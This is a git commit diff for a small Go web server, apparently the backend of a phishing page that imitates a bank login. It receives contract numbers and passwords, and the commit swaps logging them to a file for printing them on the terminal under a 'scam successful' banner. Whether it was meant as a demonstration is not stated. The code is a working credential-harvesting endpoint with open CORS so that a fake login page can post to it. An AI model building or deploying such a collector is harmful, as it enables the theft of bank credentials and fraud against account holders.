f9269594801b56a7fdc0938979eba96e09431849
drafolin <derg@drafolin.ch>
2024-05-23 11:45:21 +0200

    eased readability

--- api/go.mod
+++ api/go.mod
@@ -1,3 +1,9 @@
 module drafolin.ch/login-raif-api
 
 go 1.22.2
+
+require (
+	golang.org/x/crypto v0.23.0 // indirect
+	golang.org/x/sys v0.20.0 // indirect
+	golang.org/x/term v0.20.0 // indirect
+)
--- api/main.go
+++ api/main.go
@@ -9,22 +9,14 @@ import (
 	"net/http"
 	"os"
 	"strings"
+
+	"golang.org/x/crypto/ssh/terminal"
 )
 
 func getRoot(w http.ResponseWriter, r *http.Request) {
 	if r.Method != "POST" {
 		return
 	}
-	fmt.Printf("got / request\n")
-	f, errF := os.OpenFile("data.txt", os.O_APPEND|os.O_CREATE|os.O_WRONLY, os.ModeAppend)
-	if errF != nil {
-		log.Panic(errF)
-	}
-	defer func() {
-		if err := f.Close(); err != nil {
-			log.Panic(err)
-		}
-	}()
 
 	buf := new(strings.Builder)
 	_, err := io.Copy(buf, r.Body)
@@ -43,10 +35,32 @@ func getRoot(w http.ResponseWriter, r *http.Request) {
 		log.Panic(err)
 	}
 
-	_, errW := f.Write([]byte(fmt.Sprintf("%s - %s\n", m.Username, m.Password)))
-	if errW != nil {
-		log.Panic(errW)
+	width, height, err := terminal.GetSize(0)
+	if err != nil {
+		log.Panic(err)
 	}
+
+	fmt.Printf(strings.Repeat("\n", height/2))
+
+	fmt.Printf("%s%s%s",
+		strings.Repeat("=", width/2-len(" Arnaque réussie ! ")/2),
+		" Arnaque réussie ! ",
+		strings.Repeat("=", width/2-len(" Arnaque réussie ! ")/2))
+
+	fmt.Printf(strings.Repeat("\n", 4))
+
+	contractLine := fmt.Sprintf("Numéro de contrat: %s", m.Username)
+	passwordLine := fmt.Sprintf("Mot de passe: %s", m.Password)
+
+	longest := max(len(contractLine), len(passwordLine))
+
+	padding := width/2 - longest/2
+
+	fmt.Print(strings.Repeat(" ", padding))
+	fmt.Println(contractLine)
+
+	fmt.Printf("\n%s%s", strings.Repeat(" ", padding), passwordLine)
+	fmt.Printf(strings.Repeat("\n", height/4*3-8))
 
 	w.Header().Set("Access-Control-Allow-Origin", "*")
 	io.WriteString(w, "ok\n")
@@ -54,6 +68,7 @@ func getRoot(w http.ResponseWriter, r *http.Request) {
 
 func main() {
 	http.HandleFunc("/", getRoot)
+	fmt.Println("Listening on 0.0.0.0:3333")
 	err := http.ListenAndServe(":3333", nil)
 
 	if errors.Is(err, http.ErrServerClosed) {
